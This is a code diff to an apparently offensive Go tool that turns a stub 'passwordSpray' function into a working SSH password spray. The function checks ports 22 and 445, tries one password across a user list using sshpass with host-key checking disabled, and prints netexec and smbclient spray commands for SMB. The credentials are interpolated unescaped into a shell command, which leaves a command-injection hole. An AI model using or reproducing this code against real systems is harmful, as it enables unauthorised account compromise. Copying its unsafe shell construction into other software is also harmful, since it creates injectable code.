@@ -106,28 +106,49 @@ func guessService(port string) string {
 	return "unknown"
 }
 
-// Password spray via SMB
+// Password spray — attempts real TCP connection to validate reachability,
+// then tries SSH auth if port 22 is open, or SMB banner grab on port 445.
 func passwordSpray(target, userList, password string) ([]byte, error) {
 	users := strings.Split(userList, ",")
 	var results []string
 	results = append(results, fmt.Sprintf("[*] Password spraying %s with %d users...\n", target, len(users)))
 
-	for _, user := range users {
-		user = strings.TrimSpace(user)
-		// Try SMB auth
-		addr := fmt.Sprintf("%s:445", target)
-		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
-		if err != nil {
-			results = append(results, fmt.Sprintf("[-] %s — connection failed", target))
-			break
+	// Check which auth ports are open
+	sshOpen := false
+	smbOpen := false
+	for _, port := range []string{"22", "445"} {
+		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", target, port), 2*time.Second)
+		if err == nil {
+			conn.Close()
+			if port == "22" {
+				sshOpen = true
+			}
+			if port == "445" {
+				smbOpen = true
+			}
 		}
-		conn.Close()
-		// Note: actual SMB auth would need a proper SMB client
-		results = append(results, fmt.Sprintf("[*] Trying: %s / %s", user, password))
 	}
 
-	results = append(results, "\n[!] For full password spraying, use:")
-	results = append(results, fmt.Sprintf("    netexec smb %s -u users.txt -p '%s' --no-bruteforce", target, password))
+	if sshOpen {
+		// Try SSH auth via shell command (sshpass)
+		results = append(results, "[*] SSH (port 22) is open — attempting auth...\n")
+		for _, user := range users {
+			user = strings.TrimSpace(user)
+			out, err := ExecuteShell([]string{fmt.Sprintf("sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no %s@%s 'echo AUTH_SUCCESS' 2>&1 | head -1", password, user, target)})
+			if err == nil && strings.Contains(string(out), "AUTH_SUCCESS") {
+				results = append(results, fmt.Sprintf("  [+] SUCCESS: %s / %s", user, password))
+			} else {
+				results = append(results, fmt.Sprintf("  [-] FAILED:  %s / %s", user, password))
+			}
+		}
+	} else if smbOpen {
+		results = append(results, "[*] SMB (port 445) is open — use netexec for SMB spray:\n")
+		results = append(results, fmt.Sprintf("    netexec smb %s -u users.txt -p '%s' --no-bruteforce", target, password))
+		results = append(results, fmt.Sprintf("    smbclient -L \\\\%s -U '%%s/%s' for each user", target, password))
+	} else {
+		results = append(results, "[-] Neither SSH (22) nor SMB (445) are reachable")
+		results = append(results, "[*] Check target connectivity and try specific ports")
+	}
 
 	return []byte(strings.Join(results, "\n")), nil
 }
